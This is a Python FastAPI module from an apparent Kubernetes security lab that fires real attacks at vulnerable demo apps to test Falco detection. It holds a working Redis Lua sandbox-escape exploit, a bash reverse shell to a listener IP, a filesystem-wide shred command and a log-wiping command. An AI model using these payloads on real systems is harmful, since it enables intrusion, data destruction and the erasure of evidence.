from fastapi import APIRouter, HTTPException
import os
import re
import socket
import sys
from urllib.parse import urlparse
from models.simulation_info import SimulationInfo
from requests import exceptions as requests_exceptions
from utils.k8s_client import k8s_client

sys.path.append('/home/ubuntu/ContMigration-VT1/apps/kubernetes/vuln-spring/')

from vuln_spring_exploit import reverse_shell, data_destruction, log_removal  # type: ignore

router = APIRouter()
DEFAULT_SIMULATION_TARGET_URL = "http://10.0.0.29:30081"
DEFAULT_TARGET_URL = (os.getenv("SIMULATION_TARGET_URL", DEFAULT_SIMULATION_TARGET_URL) or DEFAULT_SIMULATION_TARGET_URL).rstrip("/")
DEFAULT_REVERSE_SHELL_LISTENER_IP = os.getenv("SIMULATION_LISTENER_IP", "10.0.0.180")
DEFAULT_REVERSE_SHELL_LISTENER_PORT = os.getenv("SIMULATION_LISTENER_PORT", "4444")
SUPPORTED_APP_PREFIXES = ("vuln-spring", "vuln-redis")
VULN_SERVICE_NAMES = {
    "vuln-spring": "vuln-spring",
    "vuln-redis": "vuln-redis",
}
VULN_NAMESPACES = ("istio-enabled", "default")

# Every simulated attack performs an action that Falco picks up with a specific default
# rule. We keep this mapping authoritative on the backend so the UI and the user understand
# which Falco rule (and therefore which config.json entry) will fire after the attack.
ATTACK_FALCO_RULES: dict[str, str] = {
    "reverse_shell": "Redirect STDOUT/STDIN to Network Connection in Container",
    "data_destruction": "Remove Bulk Data from Disk",
    "log_removal": "Clear Log Activities",
}
SUPPORTED_ATTACK_TYPES = set(ATTACK_FALCO_RULES.keys())

REDIS_LUA_ESCAPE_TEMPLATE = (
    'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); '
    'local io = io_l(); '
    'local f = io.popen("{payload}", "r"); '
    'local res = f:read("*a"); '
    'f:close(); '
    'return res'
)


def _env_override_for_cluster(cluster: str) -> str | None:
    """Allow operators to pin a target URL per cluster via env (e.g. SIMULATION_TARGET_URL_CLUSTER1)."""
    if not cluster:
        return None
    key = "SIMULATION_TARGET_URL_" + re.sub(r"[^A-Za-z0-9]", "_", cluster).upper()
    value = os.getenv(key)
    return value.rstrip("/") if value else None


def _app_prefix(app_name: str) -> str | None:
    for prefix in SUPPORTED_APP_PREFIXES:
        if app_name.startswith(prefix):
            return prefix
    return None


def _find_vuln_nodeport(client_api, service_name: str, namespaces: tuple[str, ...] = VULN_NAMESPACES):
    """Locate a vulnerable app Service in the cluster and return (namespace, nodePort)."""
    for namespace in namespaces:
        try:
            svc = client_api.read_namespaced_service(name=service_name, namespace=namespace)
        except Exception:
            continue
        for port in (svc.spec.ports or []):
            if port.node_port:
                return namespace, int(port.node_port)
    return None, None


def _pick_node_address(client_api) -> str | None:
    """Pick a usable node address (prefer ExternalIP, fall back to InternalIP) from any Ready node."""
    try:
        nodes = client_api.list_node()
    except Exception:
        return None

    def is_ready(node) -> bool:
        for condition in (node.status.conditions or []):
            if condition.type == "Ready":
                return condition.status == "True"
        return False

    ready_nodes = [n for n in nodes.items if is_ready(n)] or nodes.items
    for address_type in ("ExternalIP", "InternalIP"):
        for node in ready_nodes:
            for addr in (node.status.addresses or []):
                if addr.type == address_type and addr.address:
                    return addr.address
    return None


def _resolve_target(cluster: str | None, app_prefix: str) -> tuple[str, dict]:
    """Resolve the attack target for the given vulnerable app and cluster.

    Resolution order:
      1) env override SIMULATION_TARGET_URL_<CLUSTER>
      2) auto-discovery via Kubernetes API (Service NodePort + Node IP)
      3) global default SIMULATION_TARGET_URL / hardcoded fallback
    Returns the URL plus a metadata dict for the response (source, namespace, etc.).
    """
    if cluster:
        override = _env_override_for_cluster(cluster)
        if override:
            return override, {"source": "env_override", "cluster": cluster}

        try:
            client_api = k8s_client.get_client(cluster)
        except Exception as exc:
            raise HTTPException(status_code=400, detail=f"Unknown cluster: {cluster} ({exc})") from exc

        service_name = VULN_SERVICE_NAMES[app_prefix]
        namespace, node_port = _find_vuln_nodeport(client_api, service_name)
        if not node_port:
            raise HTTPException(
                status_code=404,
                detail=(
                    f"Service '{service_name}' with a NodePort not found in "
                    f"{'/'.join(VULN_NAMESPACES)} on cluster '{cluster}'"
                ),
            )
        node_ip = _pick_node_address(client_api)
        if not node_ip:
            raise HTTPException(
                status_code=503,
                detail=f"No Ready node with a routable address found on cluster '{cluster}'",
            )
        scheme = "redis" if app_prefix == "vuln-redis" else "http"
        return f"{scheme}://{node_ip}:{node_port}", {
            "source": "auto_discovery",
            "cluster": cluster,
            "namespace": namespace,
            "nodePort": node_port,
            "nodeAddress": node_ip,
        }

    return DEFAULT_TARGET_URL, {"source": "default", "cluster": None}


def _find_running_pod(cluster: str, namespace: str | None, app_name: str) -> str | None:
    """Best-effort lookup of a running pod backing the attacked Service (for response info)."""
    if not cluster or not app_name:
        return None
    try:
        client_api = k8s_client.get_client(cluster)
    except Exception:
        return None
    namespaces = [namespace] if namespace else list(VULN_NAMESPACES)
    for ns in namespaces:
        try:
            pods = client_api.list_namespaced_pod(namespace=ns, label_selector=f"app={app_name}")
        except Exception:
            continue
        for pod in pods.items:
            if pod.status and pod.status.phase == "Running":
                return pod.metadata.name
    return None


def _redis_endpoint(target: str) -> tuple[str, int]:
    parsed = urlparse(target if "://" in target else f"redis://{target}")
    host = parsed.hostname
    port = parsed.port or 6379
    if not host:
        raise HTTPException(status_code=400, detail=f"Could not parse Redis target: {target}")
    return host, port


def _redis_resp_bulk(value: str) -> bytes:
    data = value.encode("utf-8")
    return b"$" + str(len(data)).encode("ascii") + b"\r\n" + data + b"\r\n"


def _redis_eval_command(host: str, port: int, shell_command: str) -> str:
    payload = shell_command.replace("\\", "\\\\").replace('"', '\\"')
    script = REDIS_LUA_ESCAPE_TEMPLATE.format(payload=payload)
    request = b"*3\r\n" + _redis_resp_bulk("EVAL") + _redis_resp_bulk(script) + _redis_resp_bulk("0")
    try:
        with socket.create_connection((host, port), timeout=5) as sock:
            sock.settimeout(10)
            sock.sendall(request)
            chunks = []
            while True:
                try:
                    chunk = sock.recv(4096)
                except socket.timeout:
                    break
                if not chunk:
                    break
                chunks.append(chunk)
                if len(chunk) < 4096:
                    break
    except OSError as exc:
        raise HTTPException(status_code=502, detail=f"Redis simulation target unreachable at {host}:{port}: {exc}") from exc
    response = b"".join(chunks).decode("utf-8", errors="replace")
    if response.startswith("-"):
        raise HTTPException(status_code=502, detail=f"Redis exploit command failed: {response.strip()}")
    return response


def _redis_attack(target: str, attack_type: str) -> str:
    host, port = _redis_endpoint(target)
    _redis_eval_command(host, port, "whoami")
    if attack_type == "reverse_shell":
        command = f"bash -c 'exec bash -i &>/dev/tcp/{DEFAULT_REVERSE_SHELL_LISTENER_IP}/{DEFAULT_REVERSE_SHELL_LISTENER_PORT} <&1'"
        message = "Redis reverse shell command executed"
    elif attack_type == "data_destruction":
        command = "find / -type f ! -path '/tmp/*' ! -path '/etc/*' ! -path '/lib/*' -exec shred -u -n 3 {} \\;"
        message = "Redis data destruction command executed"
    else:
        command = "rm -f /var/log/*.log /var/log/*/*.log /var/log/lastlog /var/log/wtmp /var/log/btmp 2>/dev/null || true"
        message = "Redis log removal command executed"
    _redis_eval_command(host, port, command)
    return message


@router.get("/attack-mapping")
def get_attack_mapping():
    """Expose the static attack -> Falco rule mapping for the frontend."""
    return {
        "mapping": [
            {"attackType": attack, "falcoRule": rule}
            for attack, rule in ATTACK_FALCO_RULES.items()
        ],
        "supportedAppPrefixes": list(SUPPORTED_APP_PREFIXES),
    }


@router.post("")
def simulate(simInfo: SimulationInfo):
    """Trigger a real attack against a vulnerable demo app NodePort on the chosen cluster.

    Migration is **not** triggered here anymore. Falco running on the cluster detects the
    attack and posts an alert to /alert, which then consults config.json to decide
    whether to migrate or just log the event.
    """
    print(f"Received simulation request for {simInfo.attackType} on cluster {simInfo.cluster}")
    app_name = (simInfo.appName or "").strip()
    attack_type = (simInfo.attackType or "").strip()
    cluster = (simInfo.cluster or "").strip() or None
    namespace = (simInfo.namespace or "").strip() or None

    if not app_name:
        raise HTTPException(status_code=400, detail="appName is required")
    if not attack_type:
        raise HTTPException(status_code=400, detail="attackType is required")
    if attack_type not in SUPPORTED_ATTACK_TYPES:
        raise HTTPException(status_code=400, detail=f"Unsupported attackType: {attack_type}")
    app_prefix = _app_prefix(app_name)
    if not app_prefix:
        raise HTTPException(
            status_code=400,
            detail=(
                "Simulation currently supports only apps starting with "
                f"{', '.join(SUPPORTED_APP_PREFIXES)}. Received '{app_name}'."
            )
        )

    falco_rule = ATTACK_FALCO_RULES[attack_type]
    target_url, target_meta = _resolve_target(cluster, app_prefix)
    resolved_namespace = namespace or target_meta.get("namespace")
    pod_name = _find_running_pod(cluster, resolved_namespace, app_name) if cluster else None

    try:
        if app_prefix == "vuln-redis":
            simulation_message = _redis_attack(target_url, attack_type)
        else:
            http_target_url = target_url.replace("redis://", "http://", 1)
            if attack_type == "reverse_shell":
                reverse_shell(http_target_url, DEFAULT_REVERSE_SHELL_LISTENER_IP, DEFAULT_REVERSE_SHELL_LISTENER_PORT)
                simulation_message = "Reverse shell command executed"
            elif attack_type == "data_destruction":
                data_destruction(http_target_url)
                simulation_message = "Data destruction command executed"
            else:
                log_removal(http_target_url)
                simulation_message = "Log removal command executed"

        return {
            "message": simulation_message,
            "appName": app_name,
            "attackType": attack_type,
            "falcoRule": falco_rule,
            "cluster": cluster,
            "namespace": resolved_namespace,
            "podName": pod_name,
            "targetUrl": target_url,
            "targetSource": target_meta.get("source"),
            "detail": (
                f"Attack '{attack_type}' executed against {target_url}"
                + (f" (cluster '{cluster}'" if cluster else "")
                + (f", namespace '{resolved_namespace}'" if resolved_namespace else "")
                + (f", pod '{pod_name}'" if pod_name else "")
                + (")" if cluster else "")
                + f". Falco should now raise rule '{falco_rule}'; any migration is handled "
                + "by /alert according to config.json."
            ),
        }
    except requests_exceptions.RequestException as exc:
        raise HTTPException(status_code=502, detail=f"Simulation target unreachable at {target_url}: {exc}") from exc
